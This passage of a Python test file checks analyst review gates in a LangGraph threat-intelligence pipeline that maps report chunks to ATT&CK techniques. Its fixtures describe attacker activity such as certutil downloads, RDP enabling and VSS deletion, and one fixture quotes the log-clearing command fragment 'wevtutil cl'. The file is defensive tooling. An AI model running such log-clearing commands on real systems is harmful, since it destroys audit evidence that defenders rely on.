        reviews = [{"draft_id": "dft-001", "action": "reject",
                    "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
                    "rationale": "wrong, redo it"}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_rejection_routing"] == "extract_techniques"
        fb = result["technique_rerun_feedback"]
        assert len(fb) == 1
        assert fb[0]["chunk_id"] == "chk-001"
        assert any(t["technique_id"] == "T1190" for t in fb[0]["rejected_techniques"])

    def test_correction_rides_rerun_feedback_when_co_loop(self, raw_drafts):
        """Co-submitted rejects (one with an inline correction, one bare)
        both ride the same loop: nothing is applied to the drafts (the loop
        regenerates them) and both chunks' feedback reaches the rerun."""
        new_techs = [{"technique_id": "T1566.001", "technique_name": "x",
                      "tactic": "initial-access"}]
        reviews = [
            {"draft_id": "dft-001", "action": "reject",
             "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value,
             "analyst_edits": {"techniques": new_techs}},
            {"draft_id": "dft-002", "action": "reject",
             "reject_reason": Gate1RejectReason.WRONG_TECHNIQUE.value},
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_rejection_routing"] == "extract_techniques"
        # Correction NOT applied — the loop will regenerate the draft.
        draft1 = [d for d in raw_drafts if d["draft_id"] == "dft-001"][0]
        assert [t["technique_id"] for t in draft1["techniques"]] == ["T1190"]
        # Both chunks carried into rerun feedback; dft-001's correction preserved.
        fb = {f["chunk_id"]: f for f in result["technique_rerun_feedback"]}
        assert set(fb) == {"chk-001", "chk-002"}
        assert any(t["technique_id"] == "T1566.001"
                   for t in fb["chk-001"]["corrected_techniques"])

    def test_bad_chunk_reject_has_no_technique_rerun_feedback(self, raw_drafts):
        reviews = [{"draft_id": "dft-001", "action": "reject",
                    "reject_reason": Gate1RejectReason.BAD_CHUNK_BOUNDARY.value}]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_rejection_routing"] == "chunk_behaviors"
        # Technique rerun feedback is only for the extract_techniques route;
        # the chunk_behaviors route preserves edits via technique overrides.
        assert "technique_rerun_feedback" not in result


# =============================================================================
# Gate 1 Promotion Tests (C+A+D review-lane → bundle)
# =============================================================================

class TestChunkCorrectionLog:
    """gate_chunks appends every non-approve analyst signal to the durable
    chunk_correction_log (the transient channels it rides on are cleared
    after consumption; chunk_decisions is last-write-wins across loops)."""

    def _chunks(self):
        return [
            {"chunk_id": "c1", "text": "actor ran certutil to fetch shell",
             "sequence_index": 1, "precedes_ids": []},
            {"chunk_id": "c2", "text": "actor enabled RDP for lateral movement",
             "sequence_index": 2, "precedes_ids": []},
        ]

    def test_wholesale_reject_logged_durably(self):
        state = {
            "chunks": self._chunks(), "gates_enabled": True,
            "chunk_reviews": {"reject": {"reason": "missed_procedures",
                                         "comments": "RDP enable not chunked"}},
        }
        result = gate_chunks(state)
        log = result["chunk_correction_log"]
        assert len(log) == 1
        assert log[0]["kind"] == "wholesale_reject"
        assert log[0]["reason"] == "missed_procedures"
        assert "RDP enable" in log[0]["comments"]

    def test_log_accumulates_across_passes(self):
        prior = [{"kind": "wholesale_reject", "reason": "over_chunked",
                  "comments": "pass-1 reject"}]
        state = {
            "chunks": self._chunks(), "gates_enabled": True,
            "chunk_correction_log": prior,
            "chunk_reviews": {"decisions": [
                {"chunk_id": "c1", "action": "drop"},
            ]},
        }
        result = gate_chunks(state)
        log = result["chunk_correction_log"]
        # Pass-1 reject preserved, pass-2 drop appended.
        assert log[0] == prior[0]
        assert len(log) == 2
        assert log[1]["action"] == "remove"
        assert log[1]["chunk_id"] == "c1"

    def test_edit_snapshots_pre_edit_text(self):
        state = {
            "chunks": self._chunks(), "gates_enabled": True,
            "chunk_reviews": {"decisions": [
                {"chunk_id": "c1", "action": "edit",
                 "edits": {"text": "analyst-rewritten text"}},
            ]},
        }
        result = gate_chunks(state)
        entry = result["chunk_correction_log"][0]
        assert entry["action"] == "edit"
        # The ledger carries the LLM ORIGINAL, not the applied edit — by
        # synthesis time the chunk may have been regenerated away.
        assert entry["original_text"] == "actor ran certutil to fetch shell"
        assert entry["edits"]["text"] == "analyst-rewritten text"
        # The live chunk DID get the edit.
        edited = next(c for c in result["chunks"] if c["chunk_id"] == "c1")
        assert edited["text"] == "analyst-rewritten text"

    def test_analyst_added_chunk_logged(self):
        state = {
            "chunks": self._chunks(), "gates_enabled": True,
            "chunk_reviews": {"added_chunks": [
                {"text": "actor cleared event logs", "source_excerpt": "wevtutil cl"},
            ]},
        }
        result = gate_chunks(state)
        log = result["chunk_correction_log"]
        assert any(
            e.get("kind") == "analyst_added" and "event logs" in e.get("text", "")
            for e in log
        )

    def test_approve_only_pass_logs_nothing(self):
        state = {
            "chunks": self._chunks(), "gates_enabled": True,
            "chunk_reviews": {},
        }
        result = gate_chunks(state)
        assert result["chunk_correction_log"] == []

    def test_auto_skip_does_not_touch_log(self):
        state = {
            "chunks": self._chunks(),
            "gates_enabled": {"entities": True, "chunks": False,
                              "procedures": True, "bundle": True},
        }
        result = gate_chunks(state)
        # Machine auto-approval carries no analyst signal; the gate must not
        # write the channel at all (LangGraph keeps the prior value).
        assert "chunk_correction_log" not in result


class TestGate1Promotions:
    """Gate 1's promote-possible path moves possible-bucket picks from
    the technique_mappings_for_review review lane into the active
    technique_mappings AND adds them to the matching draft's techniques
    list. Each test sets up the relevant state slices and asserts both
    sides of the move."""

    def test_promotion_survives_a_gate1_rewind(self):
        """A non-BAD_CHUNK_BOUNDARY rejection re-runs extract_techniques over
        the SAME chunks, which rebuilds both lanes from scratch — silently
        returning a promoted pick to the review lane.

        Observed on a ransomware run: T1003.001 was promoted, the
        pass rewound, and it came back 'possible'. gate1_correction_log is
        durable across the loop, so the intent is recoverable; extract_techniques
        replays it after _split_by_bucket.
        """
        log = [{"action": "promote", "chunk_id": "chk-1", "technique_id": "T1003.001"}]
        bundle = {"chk-1": []}
        review = {"chk-1": [self._possible_pick("T1003.001")]}

        bundle, review, _, applied = _apply_promotions(
            [r for r in log if r.get("action") == "promote"],
            bundle_mappings=bundle, review_mappings=review, drafts=[],
        )

        assert applied == 1
        assert [p["technique_id"] for p in bundle["chk-1"]] == ["T1003.001"]
        # The pick is moved, not copied — an emptied chunk key is dropped.
        assert not review.get("chk-1")
        # And it carries the promotion, not just the move.
        promoted = bundle["chk-1"][0]
        assert promoted["confidence_bucket"] == "probable"
        assert promoted["confidence"] == 0.7
        assert promoted["analyst_promoted"] is True

    def test_rechunk_invalidates_the_promotion_rather_than_restoring_it(self):
        """The BAD_CHUNK_BOUNDARY path regenerates chunk_ids, so a logged
        promotion refers to a chunk that no longer exists. That is a genuine
        invalidation, not a loss to recover — and it needs no special case,
        because _apply_promotions drops unresolvable entries itself."""
        log = [{"action": "promote", "chunk_id": "chk-OLD", "technique_id": "T1003.001"}]
        bundle = {"chk-NEW": []}
        review = {"chk-NEW": [self._possible_pick("T1003.001")]}

        bundle, review, _, applied = _apply_promotions(
            log, bundle_mappings=bundle, review_mappings=review, drafts=[],
        )

        assert applied == 0
        assert bundle["chk-NEW"] == []
        assert len(review["chk-NEW"]) == 1

    def _possible_pick(self, technique_id: str = "T1204.004") -> dict:
        """Helper: shape of a possible-bucket pick from extract_techniques."""
        return {
            "technique_id": technique_id,
            "technique_name": "Malicious Copy and Paste",
            "tactic": "execution",
            "confidence": 0.45,
            "confidence_bucket": "possible",
            "source_quote": "fake captcha",
            "rationale": "Plausible per ClickFix brand expansion.",
            "stix_id": "attack-pattern--abc",
            "provenance": "llm",
        }

    def test_promotion_moves_pick_into_bundle(self, raw_drafts):
        """A {chunk_id, technique_id} promotion moves the pick out of
        review_mappings and into technique_mappings, with bucket flipped
        to 'probable' and analyst_promoted=True."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],
            "gate1_promotions": [
                {"chunk_id": "chk-001", "technique_id": "T1204.004"},
            ],
            "technique_mappings": {"chk-001": []},
            "technique_mappings_for_review": {"chk-001": [self._possible_pick()]},
        }
        result = gate_1(state)

        bundle = result["technique_mappings"]
        review = result["technique_mappings_for_review"]
        assert "chk-001" in bundle
        assert any(t["technique_id"] == "T1204.004" for t in bundle["chk-001"])
        promoted = next(t for t in bundle["chk-001"] if t["technique_id"] == "T1204.004")
        assert promoted["confidence_bucket"] == "probable"
        assert promoted["analyst_promoted"] is True
        assert promoted["confidence"] >= 0.7
        # Review lane is empty (or chunk_id removed) after the move.
        assert review.get("chk-001", []) == []

    def test_promotion_logged_durably(self, raw_drafts):
        """The transient gate1_promotions list is cleared in the same update
        that applies it — the correction-log record is the only copy that
        survives to synthesize_feedback and the captured panel."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],
            "gate1_promotions": [
                {"chunk_id": "chk-001", "technique_id": "T1204.004"},
            ],
            "technique_mappings": {"chk-001": []},
            "technique_mappings_for_review": {"chk-001": [self._possible_pick()]},
        }
        result = gate_1(state)
        assert result["gate1_promotions"] == []  # transient consumed
        log = result["gate1_correction_log"]
        assert any(
            rec.get("action") == "promote"
            and rec.get("technique_id") == "T1204.004"
            and rec.get("chunk_id") == "chk-001"
            for rec in log
        )

    def test_safety_net_auto_promote_not_logged(self, raw_drafts):
        """The orphan-draft safety-net promotion is machine-originated and
        must not be logged as an analyst correction."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],   # analyst approved everything, promoted nothing
            "gate1_promotions": [],
            # chk-001 has no bundle picks but one review-lane pick -> orphan.
            "technique_mappings": {"chk-001": []},
            "technique_mappings_for_review": {"chk-001": [self._possible_pick()]},
        }
        result = gate_1(state)
        # Safety net fired (pick reached the bundle)...
        assert any(
            t["technique_id"] == "T1204.004"
            for t in result["technique_mappings"].get("chk-001", [])
        )
        # ...but no promote record entered the analyst correction log.
        assert not any(
            rec.get("action") == "promote"
            for rec in result["gate1_correction_log"]
        )

    def test_promotion_appends_to_draft_techniques(self, raw_drafts):
        """The promoted technique is also added to the matching draft's
        `techniques` list so downstream serialization picks it up."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],
            "gate1_promotions": [
                {"chunk_id": "chk-001", "technique_id": "T1204.004"},
            ],
            "technique_mappings": {"chk-001": []},
            "technique_mappings_for_review": {"chk-001": [self._possible_pick()]},
        }
        result = gate_1(state)

        updated_drafts = result["drafts"]
        chk001_draft = next(d for d in updated_drafts if d["chunk_id"] == "chk-001")
        tids = [t["technique_id"] for t in chk001_draft["techniques"]]
        assert "T1204.004" in tids
        promoted_tech = next(
            t for t in chk001_draft["techniques"] if t["technique_id"] == "T1204.004"
        )
        assert promoted_tech["provenance"] == "analyst_promoted"

    def test_promotion_dedups_existing_bundle_pick(self, raw_drafts):
        """If the bundle already has the technique, promotion doesn't
        duplicate it. The pick still gets removed from review."""
        existing = {
            "technique_id": "T1204.004",
            "technique_name": "Malicious Copy and Paste",
            "tactic": "execution",
            "confidence": 0.85,
            "confidence_bucket": "definite",
            "source_quote": "x",
            "rationale": "y",
            "stix_id": "attack-pattern--abc",
            "provenance": "llm",
        }
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],
            "gate1_promotions": [
                {"chunk_id": "chk-001", "technique_id": "T1204.004"},
            ],
            "technique_mappings": {"chk-001": [existing]},
            "technique_mappings_for_review": {"chk-001": [self._possible_pick()]},
        }
        result = gate_1(state)

        bundle = result["technique_mappings"]
        # No duplicate
        t_count = sum(1 for t in bundle["chk-001"] if t["technique_id"] == "T1204.004")
        assert t_count == 1
        # Original (definite) pick survives
        original = next(t for t in bundle["chk-001"] if t["technique_id"] == "T1204.004")
        assert original["confidence_bucket"] == "definite"

    def test_promotion_with_unknown_chunk_silently_dropped(self, raw_drafts):
        """A promotion for a chunk_id that doesn't exist in review lane
        logs and skips — no exception. The gate has already been validated
        upstream; bad UI submissions shouldn't take the pipeline down."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],
            "gate1_promotions": [
                {"chunk_id": "chk-doesnotexist", "technique_id": "T9999"},
            ],
            "technique_mappings": {},
            "technique_mappings_for_review": {},
        }
        result = gate_1(state)
        # No-op promotions still emit the cleared list so a stale value
        # can't reapply on a second pass.
        assert result.get("gate1_promotions") == []

    def test_promotion_clears_consumed_list(self, raw_drafts):
        """After applying promotions, gate1_promotions resets to [] so a
        subsequent gate-1 run doesn't reapply the same moves."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],
            "gate1_promotions": [
                {"chunk_id": "chk-001", "technique_id": "T1204.004"},
            ],
            "technique_mappings": {"chk-001": []},
            "technique_mappings_for_review": {"chk-001": [self._possible_pick()]},
        }
        result = gate_1(state)
        assert result["gate1_promotions"] == []

    def test_no_promotions_field_is_no_op(self, raw_drafts):
        """When state has no gate1_promotions key, gate_1 is unchanged
        (back-compat with checkpoints predating the field)."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],
            # gate1_promotions intentionally absent
            "technique_mappings": {"chk-001": []},
            "technique_mappings_for_review": {},
        }
        result = gate_1(state)
        # No promotion side-effects: no technique_mappings change, no
        # gate1_promotions in the result dict.
        assert "technique_mappings" not in result
        assert "gate1_promotions" not in result

    def test_promotion_does_not_mutate_input_state(self, raw_drafts):
        """Regression: _apply_promotions must not mutate the input drafts /
        mapping dicts in place. LangGraph checkpointers can cache state
        references between supersteps, so in-place mutation can leak the
        new technique into supposedly-frozen prior checkpoint versions.
        Capture snapshots of input objects and assert they're untouched.
        """
        import copy

        input_drafts = raw_drafts
        input_bundle = {"chk-001": []}
        input_review = {"chk-001": [self._possible_pick()]}

        before_drafts = copy.deepcopy(input_drafts)
        before_bundle = copy.deepcopy(input_bundle)
        before_review = copy.deepcopy(input_review)

        state = {
            "drafts": input_drafts,
            "gates_enabled": True,
            "gate1_reviews": [],
            "gate1_promotions": [
                {"chunk_id": "chk-001", "technique_id": "T1204.004"},
            ],
            "technique_mappings": input_bundle,
            "technique_mappings_for_review": input_review,
        }
        _ = gate_1(state)

        assert input_drafts == before_drafts, "input drafts were mutated"
        assert input_bundle == before_bundle, "input technique_mappings was mutated"
        assert input_review == before_review, "input technique_mappings_for_review was mutated"

    def test_safety_net_auto_promotes_orphan_on_manual_approve(self, raw_drafts):
        """Manual path: when the analyst approves a draft whose chunk has
        no entries in technique_mappings but does have entries in
        technique_mappings_for_review, the safety net auto-promotes the
        highest-confidence review pick. Without this, the bundle would
        ship with empty x_technique_refs and the validator would
        hard-fail. Mirrors the auto-skip path's safety net."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            # Analyst approves chk-001's draft but doesn't promote any
            # review-lane pick — the orphan case.
            "gate1_reviews": [
                {"draft_id": "dft-001", "action": "approve"},
            ],
            "gate1_promotions": [],
            "technique_mappings": {"chk-001": []},
            "technique_mappings_for_review": {
                "chk-001": [
                    self._possible_pick(technique_id="T1482"),
                    {**self._possible_pick(technique_id="T1069.002"), "confidence": 0.30},
                ],
            },
        }
        result = gate_1(state)

        # Highest-confidence review pick (T1482 at 0.45) is promoted.
        bundle = result["technique_mappings"]
        assert "chk-001" in bundle
        tids = [t["technique_id"] for t in bundle["chk-001"]]
        assert "T1482" in tids
        assert "T1069.002" not in tids  # lower confidence, stays in review
        promoted = next(t for t in bundle["chk-001"] if t["technique_id"] == "T1482")
        assert promoted["analyst_promoted"] is True
        assert promoted["confidence_bucket"] == "probable"

        # Draft picks up the technique so the serializer emits non-empty
        # x_technique_refs.
        chk001_draft = next(
            d for d in result["drafts"] if d["chunk_id"] == "chk-001"
        )
        tids_on_draft = [t["technique_id"] for t in chk001_draft["techniques"]]
        assert "T1482" in tids_on_draft

    def test_safety_net_skips_rejected_drafts(self, raw_drafts):
        """A rejected draft is not in approved_ids, so the safety net
        won't manufacture a phantom technique for its chunk."""
        state = {
            "drafts": raw_drafts,
            "gates_enabled": True,
            "gate1_reviews": [
                {
                    "draft_id": "dft-001",
                    "action": "reject",
                    "reject_reason": "missing_context",
                },
            ],
            "gate1_promotions": [],
            "technique_mappings": {"chk-001": []},
            "technique_mappings_for_review": {
                "chk-001": [self._possible_pick(technique_id="T1482")],
            },
        }
        result = gate_1(state)

        # Bundle is untouched for chk-001 — the draft was rejected.
        bundle = result.get("technique_mappings", {"chk-001": []})
        assert bundle.get("chk-001", []) == []


# =============================================================================
# Gate 2 Tests
# =============================================================================

class TestGate2:
    """Gate 2: Relationship review."""

    def test_auto_skip_approves(self):
        """gates_enabled=False auto-approves."""
        state = {"gates_enabled": False}
        result = gate_2(state)

        # See gate_0 / gate_1 notes above: post-submit status is
        # RESUMING_FROM_GATE_2 so the serializer overwrites it clean.
        assert result["status"] == PipelineStatus.RESUMING_FROM_GATE_2.value
        assert result["gate2_decision"]["approved"] is True
        assert result["gate2_decision"]["feedback"] is None

    def test_approved(self):
        """Analyst approves relationships."""
        state = {
            "gates_enabled": True,
            "gate2_review": {"approved": True, "feedback": None},
        }
        result = gate_2(state)

        assert result["gate2_decision"]["approved"] is True

    def test_rejected_with_feedback(self):
        """Analyst rejects with feedback."""
        state = {
            "gates_enabled": True,
            "gate2_review": {
                "approved": False,
                "feedback": "Missing attributed-to relationship for LockBit 3.0",
            },
        }
        result = gate_2(state)

        assert result["gate2_decision"]["approved"] is False
        assert "attributed-to" in result["gate2_decision"]["feedback"]

    def test_rejected_without_feedback(self):
        """Analyst rejects without feedback."""
        state = {
            "gates_enabled": True,
            "gate2_review": {"approved": False},
        }
        result = gate_2(state)

        assert result["gate2_decision"]["approved"] is False
        assert result["gate2_decision"]["feedback"] is None

    def test_missing_review_defaults_to_reject(self):
        """Missing gate2_review defaults to not approved (safe default)."""
        state = {"gates_enabled": True}
        result = gate_2(state)

        assert result["gate2_decision"]["approved"] is False

    def test_empty_review_defaults_to_reject(self):
        """Empty gate2_review dict defaults to not approved."""
        state = {"gates_enabled": True, "gate2_review": {}}
        result = gate_2(state)

        assert result["gate2_decision"]["approved"] is False

    def test_per_rel_empty_reviews_approves_all(self):
        """When the API submits gate2_reviews=[] (per-rel mode, no
        mutations) the natural reading is 'approve all unmentioned
        rels.' Regression: the prior empty-list behavior was
        falling through to batch mode and rejecting everything, which
        broke the BundleReviewCanvas's 'Approve as-is' path."""
        state = {
            "gates_enabled": True,
            "gate2_reviews": [],
            "relationship_preview": [
                {"id": "rel-1", "relationship_type": "uses",
                 "source_name": "A", "target_name": "B"},
                {"id": "rel-2", "relationship_type": "uses",
                 "source_name": "C", "target_name": "D"},
            ],
        }
        result = gate_2(state)
        assert result["gate2_decision"]["approved"] is True
        assert sorted(result["gate2_approved_rel_ids"]) == ["rel-1", "rel-2"]
        assert result["gate2_removed_rel_ids"] == []

    def test_per_rel_only_remove_implies_approve_rest(self):
        """When the analyst removes one rel and leaves the rest
        unmentioned, the unmentioned ones are still approved."""
        state = {
            "gates_enabled": True,
            "gate2_reviews": [
                {"rel_id": "rel-2", "action": "remove"},
            ],
            "relationship_preview": [
                {"id": "rel-1", "relationship_type": "uses",
                 "source_name": "A", "target_name": "B"},
                {"id": "rel-2", "relationship_type": "uses",
                 "source_name": "C", "target_name": "D"},
                {"id": "rel-3", "relationship_type": "uses",
                 "source_name": "E", "target_name": "F"},
            ],
        }
        result = gate_2(state)
        assert sorted(result["gate2_approved_rel_ids"]) == ["rel-1", "rel-3"]
        assert result["gate2_removed_rel_ids"] == ["rel-2"]
        # A removal REFINES the bundle; it does not reject it. Returning
        # approved=False here used to route back to `normalize`, which
        # re-derived the preview and discarded the analyst's decisions —
        # a livelock whose only exit was approving everything.
        assert result["gate2_decision"]["approved"] is True
        # The consumed channel is cleared so a follow-up batch submission
        # is not shadowed by stale per-rel decisions.
        assert result["gate2_reviews"] is None

    def test_per_rel_added_relationship(self):
        """Analyst-added rels (rel_id starts with 'added_') flow into
        gate2_added_rels with their fields preserved."""
        state = {
            "gates_enabled": True,
            "gate2_reviews": [
                {"rel_id": "added_xyz", "action": "approve",
                 "edited_rel_type": "targets",
                 "edited_source": "Procedure X",
                 "edited_target": "Acme Corp"},
            ],
            "relationship_preview": [],
        }
        result = gate_2(state)
        assert len(result["gate2_added_rels"]) == 1
        added = result["gate2_added_rels"][0]
        assert added["relationship_type"] == "targets"
        assert added["source_name"] == "Procedure X"
        assert added["target_name"] == "Acme Corp"


# =============================================================================
# Routing tests (these test the functions used by pipeline.py conditional edges)
# =============================================================================

class TestRejectionRouting:
    """Test routing logic via gate_1 output."""

    def test_no_rejections_routes_to_normalize(self, raw_drafts):
        """All approved -> routing is None (pipeline.py routes to normalize)."""
        reviews = [
            {"draft_id": "dft-001", "action": "approve"},
            {"draft_id": "dft-002", "action": "approve"},
            {"draft_id": "dft-003", "action": "approve"},
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_rejection_routing"] is None

    def test_all_removed_routes_to_normalize(self, raw_drafts):
        """All removed (no rejections) -> routing is None."""
        reviews = [
            {"draft_id": "dft-001", "action": "remove"},
            {"draft_id": "dft-002", "action": "remove"},
            {"draft_id": "dft-003", "action": "remove"},
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_rejection_routing"] is None
        assert result["gate1_approved_draft_ids"] == []

    def test_multiple_reject_reasons(self, raw_drafts):
        """Multiple rejection reasons: BAD_CHUNK_BOUNDARY wins."""
        reviews = [
            {"draft_id": "dft-001", "action": "reject", "reject_reason": "too_vague"},
            {"draft_id": "dft-002", "action": "reject", "reject_reason": "bad_chunk_boundary"},
            {"draft_id": "dft-003", "action": "reject", "reject_reason": "hallucinated"},
        ]
        state = {"drafts": raw_drafts, "gates_enabled": True, "gate1_reviews": reviews}
        result = gate_1(state)
        assert result["gate1_rejection_routing"] == "chunk_behaviors"


# =============================================================================
# Per-gate enable/disable: normalize_gates(), is_gate_enabled(), gate node behavior
# =============================================================================

class TestNormalizeGates:
    """normalize_gates() coerces input forms into a canonical dict."""

    def test_none_returns_default_all_true(self):
        from app.graph.state import DEFAULT_GATES, normalize_gates
        result = normalize_gates(None)
        assert result == DEFAULT_GATES
        assert all(result.values())

    def test_legacy_bool_true_expands_to_all_true(self):
        from app.graph.state import GATE_KEYS, normalize_gates
        result = normalize_gates(True)
        assert result == {k: True for k in GATE_KEYS}

    def test_legacy_bool_false_expands_to_all_false(self):
        from app.graph.state import GATE_KEYS, normalize_gates
        result = normalize_gates(False)
        assert result == {k: False for k in GATE_KEYS}

    def test_full_dict_passes_through(self):
        from app.graph.state import normalize_gates
        result = normalize_gates(
            {"entities": False, "chunks": True, "procedures": True, "bundle": False}
        )
        assert result == {"entities": False, "chunks": True, "procedures": True, "bundle": False}

    def test_partial_dict_fills_missing_with_true(self):
        from app.graph.state import normalize_gates
        result = normalize_gates({"procedures": False})
        assert result == {"entities": True, "chunks": True, "procedures": False, "bundle": True}

    def test_unknown_key_raises(self):
        from app.graph.state import normalize_gates
        with pytest.raises(ValueError, match="unknown gate keys"):
            normalize_gates({"entities": True, "techniques": False})

    def test_non_bool_value_raises(self):
        from app.graph.state import normalize_gates
        with pytest.raises(ValueError, match="must be bool"):
            normalize_gates({"entities": "yes"})

    def test_invalid_type_raises(self):
        from app.graph.state import normalize_gates
        with pytest.raises(ValueError, match="must be bool or dict"):
            normalize_gates(["entities"])


class TestIsGateEnabled:
    """is_gate_enabled() reads per-gate config from state, tolerates legacy bool."""

    def test_dict_with_key(self):
        from app.graph.state import is_gate_enabled
        state = {"gates_enabled": {"entities": False, "procedures": True, "bundle": True}}
        assert is_gate_enabled(state, "entities") is False
        assert is_gate_enabled(state, "procedures") is True

    def test_dict_missing_key_defaults_true(self):
        """Forward-compat: a future gate key not in state defaults to enabled."""
        from app.graph.state import is_gate_enabled
        state = {"gates_enabled": {"entities": False}}
        assert is_gate_enabled(state, "techniques") is True

    def test_legacy_bool_true_treated_as_all_enabled(self):
        from app.graph.state import is_gate_enabled
        state = {"gates_enabled": True}
        assert is_gate_enabled(state, "entities") is True
        assert is_gate_enabled(state, "procedures") is True
        assert is_gate_enabled(state, "bundle") is True

    def test_legacy_bool_false_treated_as_all_disabled(self):
        from app.graph.state import is_gate_enabled
        state = {"gates_enabled": False}
        assert is_gate_enabled(state, "entities") is False
        assert is_gate_enabled(state, "procedures") is False

    def test_missing_field_defaults_enabled(self):
        from app.graph.state import is_gate_enabled
        assert is_gate_enabled({}, "entities") is True


class TestPerGateAutoSkip:
    """Each gate node honors its own enable flag independently."""

    def test_gate0_off_others_on_only_gate0_auto_skips(self, raw_entities, raw_drafts):
        """entities=False, procedures=True: gate_0 auto-approves, gate_1 waits for reviews."""
        gates = {"entities": False, "procedures": True, "bundle": True}

        g0_state = {"entities": raw_entities, "gates_enabled": gates}
        g0_result = gate_0(g0_state)
        # gate_0 auto-approved (no reviews needed)
        assert len(g0_result["validated_entities"]) == len(raw_entities)
        assert all(e["gate_action"] == "approve" for e in g0_result["validated_entities"])

        # gate_1 with no reviews + procedures=True takes the manual-review
        # path (approves drafts that have no explicit review, but marks the
        # call as "real" review processing rather than auto-skip). We assert
        # via the status: auto-skip writes RESUMING_FROM_GATE_1 with no
        # reviews map; manual-review path writes the same status but sourced
        # from the per-draft review loop (gate1_decisions populated).
        g1_state = {"drafts": raw_drafts, "gates_enabled": gates, "gate1_reviews": []}
        g1_result = gate_1(g1_state)
        # All drafts auto-approved because no explicit review (default safe approve).
        # The point of this test: gates=False would have used _auto_approve_drafts
        # path; gates=True uses the manual-review loop. Both happen to approve
        # everything here, but only the manual path produces gate1_decisions
        # with action records keyed off review absence.
        assert len(g1_result["gate1_decisions"]) == len(raw_drafts)

    def test_only_procedures_off(self, raw_entities, raw_drafts):
        """entities=True, procedures=False: gate_0 needs reviews, gate_1 auto-approves."""
        gates = {"entities": True, "procedures": False, "bundle": True}

        # gate_1 auto-approves drafts when procedures=False, regardless of reviews
        g1_state = {"drafts": raw_drafts, "gates_enabled": gates}
        g1_result = gate_1(g1_state)
        assert g1_result["gate1_approved_draft_ids"] == [d["draft_id"] for d in raw_drafts]
        assert g1_result["gate1_rejection_routing"] is None

    def test_only_bundle_off_gate2_auto_approves(self):
        """bundle=False: gate_2 auto-approves regardless of relationships in state."""
        gates = {"entities": True, "procedures": True, "bundle": False}
        state = {
            "gates_enabled": gates,
            "relationship_preview": [
                {"id": "rel-001", "type": "uses"},
                {"id": "rel-002", "type": "indicates"},
            ],
        }
        result = gate_2(state)
        assert result["gate2_decision"]["approved"] is True
        assert result["gate2_approved_rel_ids"] == ["rel-001", "rel-002"]

    def test_all_off_all_gates_auto_skip(self, raw_entities, raw_drafts):
        """All gates disabled → all auto-approve."""
        gates = {"entities": False, "procedures": False, "bundle": False}

        g0 = gate_0({"entities": raw_entities, "gates_enabled": gates})
        assert all(e["gate_action"] == "approve" for e in g0["validated_entities"])

        g1 = gate_1({"drafts": raw_drafts, "gates_enabled": gates})
        assert g1["gate1_approved_draft_ids"] == [d["draft_id"] for d in raw_drafts]

        g2 = gate_2({"gates_enabled": gates, "relationship_preview": []})
        assert g2["gate2_decision"]["approved"] is True

    def test_legacy_bool_in_state_still_works(self, raw_entities):
        """Backwards-compat: a legacy bool in state["gates_enabled"] is honored."""
        # gates_enabled=False (legacy bool) should auto-skip every gate.
        result = gate_0({"entities": raw_entities, "gates_enabled": False})
        assert all(e["gate_action"] == "approve" for e in result["validated_entities"])


# =============================================================================
# Gate chunks
# =============================================================================

class TestGateChunks:
    """gate_chunks behavior across the three paths: disabled / reject / approve."""

    def test_auto_approves_when_disabled(self):
        chunks = [{"chunk_id": "ch-1"}, {"chunk_id": "ch-2"}, {"chunk_id": "ch-3"}]
        state = {"chunks": chunks, "gates_enabled": {"chunks": False}}
        result = gate_chunks(state)
        assert result["chunks_approved_ids"] == ["ch-1", "ch-2", "ch-3"]
        assert result["chunks_rejection_routing"] is None

    def test_no_review_safe_default_approves(self):
        """Enabled gate, no analyst review submitted -> safe default approve."""
        chunks = [{"chunk_id": "ch-1"}, {"chunk_id": "ch-2"}]
        state = {"chunks": chunks, "gates_enabled": {"chunks": True}}
        result = gate_chunks(state)
        assert result["chunks_approved_ids"] == ["ch-1", "ch-2"]
        assert all(d["action"] == "approve" for d in result["chunk_decisions"])

    def test_empty_chunks(self):
        result = gate_chunks({"chunks": [], "gates_enabled": {"chunks": True}})
        assert result["chunks_approved_ids"] == []
        assert result["chunk_decisions"] == []

    def test_reject_routes_to_chunk_behaviors_with_feedback(self):
        chunks = [{"chunk_id": "ch-1"}]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "reject": {
                    "reason": "missed_procedures",
                    "comments": "VSS deletion was omitted from chunk list",
                },
            },
        }
        result = gate_chunks(state)
        assert result["chunks_rejection_routing"] == "chunk_behaviors"
        assert result["chunk_rerun_feedback"] == {
            "reason": "missed_procedures",
            "comments": "VSS deletion was omitted from chunk list",
        }
        # Approval bookkeeping is empty on reject.
        assert result["chunk_decisions"] == []
        assert result["chunks_approved_ids"] == []

    def test_sequential_override_applies_on_approve(self):
        """The analyst can flip the auto-detected sequentiality at the gate.

        Entity extraction sets the flag once; without this override a source
        misread as a catalogue lost every PRECEDES edge at serialization and
        the only fix was re-ingesting it.
        """
        state = {
            "chunks": [{"chunk_id": "ch-1"}],
            "gates_enabled": {"chunks": True},
            "is_sequential": False,
            "sequentiality_rationale": "Catalogue of four campaigns.",
            "chunk_reviews": {"is_sequential": True},
        }
        result = gate_chunks(state)
